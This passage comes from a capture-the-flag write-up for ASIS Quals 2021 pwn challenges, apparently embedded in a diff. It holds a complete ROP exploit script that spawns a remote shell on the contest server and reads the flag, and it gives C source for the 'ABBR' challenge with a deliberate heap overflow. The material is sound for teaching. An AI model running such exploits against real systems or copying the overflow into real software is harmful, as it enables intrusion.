+</span></span><span style="display:flex;"><span> ► f <span style="color:#ae81ff">0</span>         0x40123c justpwnit+46
+</span></span><span style="display:flex;"><span>   f <span style="color:#ae81ff">1</span> 0x6262626262626262
+</span></span><span style="display:flex;"><span>   f <span style="color:#ae81ff">2</span>              0xa
+</span></span><span style="display:flex;"><span>   f <span style="color:#ae81ff">3</span>              0x0
+</span></span><span style="display:flex;"><span>────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</span></span><span style="display:flex;"><span>pwndbg&gt; 
+</span></span></code></pre></div><h2 id="final-script">Final script<a hidden class="anchor" aria-hidden="true" href="#final-script">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># p = elf.process()</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;168.119.108.148&#39;</span>, <span style="color:#ae81ff">11010</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pop_rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000401b0d</span>
+</span></span><span style="display:flex;"><span>mov <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x406c3d</span>					<span style="color:#75715e"># mov qword ptr [rdi], rsi ; ret</span>
+</span></span><span style="display:flex;"><span>pop_rsi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4019a3</span>
+</span></span><span style="display:flex;"><span>data_seg <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0040c120</span>
+</span></span><span style="display:flex;"><span>pop_rax <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x401001</span>
+</span></span><span style="display:flex;"><span>syscall <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4013e9</span>
+</span></span><span style="display:flex;"><span>pop_rdx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x403d23</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recv()
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;-2&#39;</span>)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recv()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(pop_rdi)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(data_seg)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(pop_rsi)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(mov)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(pop_rdi)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(data_seg)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(pop_rsi)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(pop_rdx)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(pop_rax)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x3b</span>)
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(syscall)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><hr>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Opening connection to 168.119.108.148 on port 11010: Done
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Switching to interactive mode
+</span></span><span style="display:flex;"><span>$ id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>999<span style="color:#f92672">(</span>pwn<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>999<span style="color:#f92672">(</span>pwn<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>999<span style="color:#f92672">(</span>pwn<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>$ ls
+</span></span><span style="display:flex;"><span>chall
+</span></span><span style="display:flex;"><span>flag-69a1f60d8055c88ea27fed1ab926b2b6.txt
+</span></span><span style="display:flex;"><span>$ cat flag-69a1f60d8055c88ea27fed1ab926b2b6.txt
+</span></span><span style="display:flex;"><span>ASIS<span style="color:#f92672">{</span>p01nt_RSP_2_h34p!_RHP_1n5t34d_0f_RSP?<span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>Hihi first blood.</p>
+<p><img loading="lazy" src="/posts/asisquals2021/img2.png" alt="img"  />
+</p>
+<h1 id="abbr">ABBR:<a hidden class="anchor" aria-hidden="true" href="#abbr">#</a></h1>
+<ul>
+<li>Category: pwn</li>
+<li>Points: 71</li>
+<li>Solves: 68</li>
+<li>Description: Abbreviations in English are complicated&hellip; Why?</li>
+</ul>
+<h2 id="source-code-overview-1">Source code overview<a hidden class="anchor" aria-hidden="true" href="#source-code-overview-1">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;ctype.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;rules.h&#34;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> Translator {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>translate)(<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>text;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> size;
+</span></span><span style="display:flex;"><span>} Translator;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">english_expand</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>text) {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> i, alen, blen;
+</span></span><span style="display:flex;"><span>  Rule <span style="color:#f92672">*</span>r;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>p, <span style="color:#f92672">*</span>q;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>end <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>text[strlen(text)<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]; <span style="color:#75715e">// pointer to the last character
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Replace all abbreviations */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (p <span style="color:#f92672">=</span> text; <span style="color:#f92672">*</span>p; <span style="color:#f92672">++</span>p) {		<span style="color:#75715e">// [3]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">for</span> (i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#66d9ef">sizeof</span>(rules) <span style="color:#f92672">/</span> <span style="color:#66d9ef">sizeof</span>(Rule); i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>      r <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>rules[i];
+</span></span><span style="display:flex;"><span>      alen <span style="color:#f92672">=</span> strlen(r<span style="color:#f92672">-&gt;</span>a);
+</span></span><span style="display:flex;"><span>      blen <span style="color:#f92672">=</span> strlen(r<span style="color:#f92672">-&gt;</span>b);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (strncasecmp(p, r<span style="color:#f92672">-&gt;</span>a, alen) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// i.e &#34;i&#39;m pwn noob.&#34; --&gt; &#34;i&#39;m pwn XXnoob.&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">for</span> (q <span style="color:#f92672">=</span> end; q <span style="color:#f92672">&gt;</span> p; <span style="color:#f92672">--</span>q)
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">*</span>(q<span style="color:#f92672">+</span>blen<span style="color:#f92672">-</span>alen) <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>q;
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Update end
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        end <span style="color:#f92672">+=</span> blen<span style="color:#f92672">-</span>alen;
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(end<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>) <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\0&#39;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// i.e &#34;i&#39;m pwn XXnoob.&#34; --&gt; &#34;i&#39;m pwn newbie.&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        memcpy(p, r<span style="color:#f92672">-&gt;</span>b, blen);
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Translator <span style="color:#f92672">*</span><span style="color:#a6e22e">translator_new</span>(<span style="color:#66d9ef">int</span> size) {
+</span></span><span style="display:flex;"><span>  Translator <span style="color:#f92672">*</span>t;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Allocate region for text */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>text <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)calloc(<span style="color:#66d9ef">sizeof</span>(<span style="color:#66d9ef">char</span>), size);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (text <span style="color:#f92672">==</span> NULL)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* Initialize translator */</span>
+</span></span><span style="display:flex;"><span>  t <span style="color:#f92672">=</span> (Translator<span style="color:#f92672">*</span>)malloc(<span style="color:#66d9ef">sizeof</span>(Translator));
+</span></span><span style="display:flex;"><span>  t<span style="color:#f92672">-&gt;</span>text <span style="color:#f92672">=</span> text;
+</span></span><span style="display:flex;"><span>  t<span style="color:#f92672">-&gt;</span>size <span style="color:#f92672">=</span> size;
+</span></span><span style="display:flex;"><span>  t<span style="color:#f92672">-&gt;</span>translate <span style="color:#f92672">=</span> english_expand;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> t;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">translator_reset</span>(Translator <span style="color:#f92672">*</span>t) {
+</span></span><span style="display:flex;"><span>  memset(t<span style="color:#f92672">-&gt;</span>text, <span style="color:#ae81ff">0</span>, t<span style="color:#f92672">-&gt;</span>size);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>  setvbuf(stdin, NULL, _IONBF, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  setvbuf(stdout, NULL, _IONBF, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  alarm(<span style="color:#ae81ff">60</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  Translator <span style="color:#f92672">*</span>t <span style="color:#f92672">=</span> translator_new(<span style="color:#ae81ff">0x1000</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> (<span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Input data */</span>
+</span></span><span style="display:flex;"><span>    translator_reset(t);
+</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;Enter text: &#34;</span>);
+</span></span><span style="display:flex;"><span>    fgets(t<span style="color:#f92672">-&gt;</span>text, t<span style="color:#f92672">-&gt;</span>size, stdin);				<span style="color:#75715e">// [2]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (t<span style="color:#f92672">-&gt;</span>text[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;\n&#39;</span>)
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Expand abbreviation */</span>
+</span></span><span style="display:flex;"><span>    t<span style="color:#f92672">-&gt;</span>translate(t<span style="color:#f92672">-&gt;</span>text);
+</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;Result: %s&#34;</span>, t<span style="color:#f92672">-&gt;</span>text);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Chương trình sẽ thay thế những chữ viết tắt (abbr) thành những chữ dài hơn (expanded). Dưới đây là những chữ đó:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>a; <span style="color:#75715e">// abbreviated string (i.e &#34;asap&#34;)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>b; <span style="color:#75715e">// expanded string (i.e &#34;as soon as possible&#34;)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>} Rule;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Why are there so many abbreviations in English!!?? :exploding_head:
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>Rule rules[] <span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>   {.a<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;2f4u&#34;</span>, .b<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;too fast for you&#34;</span>},
+</span></span><span style="display:flex;"><span>   {.a<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;4yeo&#34;</span>, .b<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;for your eyes only&#34;</span>},
+</span></span><span style="display:flex;"><span>   {.a<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;fyeo&#34;</span>, .b<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;for your eyes only&#34;</span>},
+</span></span><span style="display:flex;"><span>   {.a<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;aamof&#34;</span>, .b<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;as a matter of fact&#34;</span>},
+</span></span><span style="display:flex;"><span>   {.a<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;afaik&#34;</span>, .b<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;as far as i know&#34;</span>},
+</span></span><span style="display:flex;"><span>   {.a<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;afk&#34;</span>, .b<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;away from keyboard&#34;</span>},
+</span></span><span style="display:flex;"><span>   {.a<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;aka&#34;</span>, .b<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;also known as&#34;</span>},
+</span></span><span style="display:flex;"><span>   {.a<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;b2k&#34;</span>, .b<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;back to keyboard&#34;</span>},
+</span></span><span style="display:flex;"><span>   {.a<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;btk&#34;</span>, .b<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;back to keyboard&#34;</span>},
+</span></span><span style="display:flex;"><span>   {.a<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;btt&#34;</span>, .b<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;back to topic&#34;</span>},
+</span></span><span style="display:flex;"><span>   {.a<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;btw&#34;</span>, .b<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;by the way&#34;</span>},
+</span></span><span style="display:flex;"><span>   {.a<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;b/c&#34;</span>, .b<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;because&#34;</span>},
+</span></span><span style="display:flex;"><span>   {.a<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;c&amp;p&#34;</span>, .b<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;copy and paste&#34;</span>},
+</span></span><span style="display:flex;"><span>   {.a<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;cys&#34;</span>, .b<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;check your settings&#34;</span>},
+</span></span><span style="display:flex;"><span>   {.a<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;diy&#34;</span>, .b<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;do it yourself&#34;</span>},
+</span></span><span style="display:flex;"><span>   {.a<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;eobd&#34;</span>, .b<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;end of business day&#34;</span>},
+</span></span><span style="display:flex;"><span>   {.a<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;faq&#34;</span>, .b<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;frequently asked questions&#34;</span>},
+</span></span><span style="display:flex;"><span>   {.a<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;fka&#34;</span>, .b<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;formerly known as&#34;</span>},
+</span></span><span style="display:flex;"><span>   {.a<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;fwiw&#34;</span>, .b<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;for what it&#39;s worth&#34;</span>},
+</span></span><span style="display:flex;"><span>   {.a<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;fyi&#34;</span>, .b<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;for your information&#34;</span>},
+</span></span><span style="display:flex;"><span>   {.a<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;jfyi&#34;</span>, .b<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;just for your information&#34;</span>},
+</span></span><span style="display:flex;"><span>   {.a<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hf&#34;</span>, .b<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;have fun&#34;</span>},
+</span></span><span style="display:flex;"><span>   {.a<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hth&#34;</span>, .b<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;hope this helps&#34;</span>},
+</span></span><span style="display:flex;"><span>   {.a<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;idk&#34;</span>, .b<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;i don&#39;t know&#34;</span>},
+</span></span><span style="display:flex;"><span>   {.a<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;iirc&#34;</span>, .b<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;if i remember correctly&#34;</span>},
+</span></span><span style="display:flex;"><span>   {.a<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;imho&#34;</span>, .b<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;in my humble opinion&#34;</span>},
+</span></span><span style="display:flex;"><span>   {.a<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;imo&#34;</span>, .b<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;in my opinion&#34;</span>},
+</span></span><span style="display:flex;"><span>   {.a<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;imnsho&#34;</span>, .b<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;in my not so humble opinion&#34;</span>},
+</span></span><span style="display:flex;"><span>   {.a<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;iow&#34;</span>, .b<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;in other words&#34;</span>},
+</span></span><span style="display:flex;"><span>   {.a<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;itt&#34;</span>, .b<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;in this thread&#34;</span>},
+</span></span><span style="display:flex;"><span>   {.a<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;dgmw&#34;</span>, .b<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;don&#39;t get me wrong&#34;</span>},
+</span></span><span style="display:flex;"><span>   {.a<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;mmw&#34;</span>, .b<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;mark my words&#34;</span>},
+</span></span><span style="display:flex;"><span>   {.a<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;nntr&#34;</span>, .b<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;no need to reply&#34;</span>},
+</span></span><span style="display:flex;"><span>   {.a<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;noob&#34;</span>, .b<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;newbie&#34;</span>},
+</span></span><span style="display:flex;"><span>   {.a<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;noyb&#34;</span>, .b<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;none of your business&#34;</span>},
+</span></span><span style="display:flex;"><span>   {.a<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;nrn&#34;</span>, .b<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;no reply necessary&#34;</span>},
+</span></span><span style="display:flex;"><span>   {.a<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;otoh&#34;</span>, .b<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;on the other hand&#34;</span>},
+</span></span><span style="display:flex;"><span>   {.a<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;rtfm&#34;</span>, .b<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;read the fine manual&#34;</span>},
+</span></span><span style="display:flex;"><span>   {.a<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;scnr&#34;</span>, .b<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;sorry, could not resist&#34;</span>},
+</span></span><span style="display:flex;"><span>   {.a<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;sflr&#34;</span>, .b<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;sorry for late reply&#34;</span>},
+</span></span><span style="display:flex;"><span>   {.a<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;tba&#34;</span>, .b<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;to be announced&#34;</span>},
+</span></span><span style="display:flex;"><span>   {.a<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;tbc&#34;</span>, .b<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;to be continued&#34;</span>},
+</span></span><span style="display:flex;"><span>   {.a<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;tia&#34;</span>, .b<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;thanks in advance&#34;</span>},
+</span></span><span style="display:flex;"><span>   {.a<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;tq&#34;</span>, .b<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;thank you&#34;</span>},
+</span></span><span style="display:flex;"><span>   {.a<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;tyvm&#34;</span>, .b<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;thank you very much&#34;</span>},
+</span></span><span style="display:flex;"><span>   {.a<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;tyt&#34;</span>, .b<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;take your time&#34;</span>},
+</span></span><span style="display:flex;"><span>   {.a<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ttyl&#34;</span>, .b<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;talk to you later&#34;</span>},
+</span></span><span style="display:flex;"><span>   {.a<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;wfm&#34;</span>, .b<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;works for me&#34;</span>},
+</span></span><span style="display:flex;"><span>   {.a<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;wtf&#34;</span>, .b<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;what the fuck&#34;</span>},
+</span></span><span style="display:flex;"><span>   {.a<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;wrt&#34;</span>, .b<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;with regard to&#34;</span>},
+</span></span><span style="display:flex;"><span>   {.a<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ymmd&#34;</span>, .b<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;you made my day&#34;</span>},
+</span></span><span style="display:flex;"><span>   {.a<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;icymi&#34;</span>, .b<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;in case you missed it&#34;</span>},
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e">// pwners abbreviations
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>   {.a<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;rop &#34;</span>, .b<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;return oriented programming &#34;</span>},
+</span></span><span style="display:flex;"><span>   {.a<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;jop &#34;</span>, .b<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;jump oriented programming &#34;</span>},
+</span></span><span style="display:flex;"><span>   {.a<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;cop &#34;</span>, .b<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;call oriented programming &#34;</span>},
+</span></span><span style="display:flex;"><span>   {.a<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;aar&#34;</span>, .b<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;arbitrary address read&#34;</span>},
+</span></span><span style="display:flex;"><span>   {.a<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;aaw&#34;</span>, .b<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;arbitrary address write&#34;</span>},
+</span></span><span style="display:flex;"><span>   {.a<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;www&#34;</span>, .b<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;write what where&#34;</span>},
